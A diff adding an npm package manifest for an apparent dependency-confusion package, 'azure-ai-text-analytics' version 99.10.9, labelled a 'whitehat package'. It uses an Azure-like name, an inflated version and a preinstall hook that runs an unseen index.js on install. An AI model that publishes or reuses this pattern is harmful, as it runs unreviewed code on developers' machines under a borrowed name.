@@ -1,0 +1,39 @@
+{
+    "name": "azure-ai-text-analytics",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-ai-text-analytics@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-LHx/vEphtXsAkSPFtFMHjQNrhHWTdujVc/EeT1BX17W/3xGfacpQPIp32MQTmh0lqpaAGEQlmMZ6EouL8uCHiw==",
+        "shasum": "9d7ca44d40faebf71765924878651cf22e8c6a23",
+        "tarball": "https://registry.npmjs.org/azure-ai-text-analytics/-/azure-ai-text-analytics-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3587,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSfzCRA9TVsSAnZWagAA9G4P/jHiuOxjoi9YkWpamAeC\nQGjUjuVnvYia/ltuZNCoUNave0KismZ5+oGXxxEGTEMZmL/hL9FZf3V6PkUT\nRJeFWJnpalg4bHSCvMvdnHTiY/CiZnS0IaQLY4i2wff2GBpqArGhNwK1IaRP\nkjgYcLqu1afqTE53ZJ5Rd2102O9ONofaNEGToPkMvt5GE8y4lrpfshoFOag4\n/82u6pzHR9kT8Ysag+ODTj7V8M1MJBLJahkkJgF4IZ1UryPsLxDK6rVEpj+g\nCH/LUY5wMTsh/GYqjYyAj5l47Ytkvs7al4m/47tFecmQ/mYa22q6YqfPeR6P\nYsKn8EUd2g+UK1cSKBseys93cQJCZKclggIuDqfyytfBZuHS53A8X1dMkRaP\nV8nmNwyEhtVI0Ro9vxpWLaTeKQmFMe7Mwv7H08QwZF0F2XbP9NPir4p7imeP\nw6LvXhPOv8cbsNwxH5KEJbv++20dHKaeIPz8hocUESWTBWcuHnMd3zWAcT9g\navM93ANLeoiNOlDo1O5Gq3aAn7ucb9fFEvLC2REl1UBtq9VlFu/J/8qP3LMq\nsPj2pFt1w4MgK3tgdyHUD8yfRtSHWQJ5eHbEeAvmAcexc1HJ0FHeCYDp8X3D\nLf2ouYZWktVL9aKNbU5oTAwVAp4DSYAbB4X6wcuwelBVavm1MfizMVzDzWdx\nKG4X\r\n=w5Dx\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-ai-text-analytics_99.10.9_1637951475855_0.9008202912891659"
+    },
+    "_hasShrinkwrap": false
+}
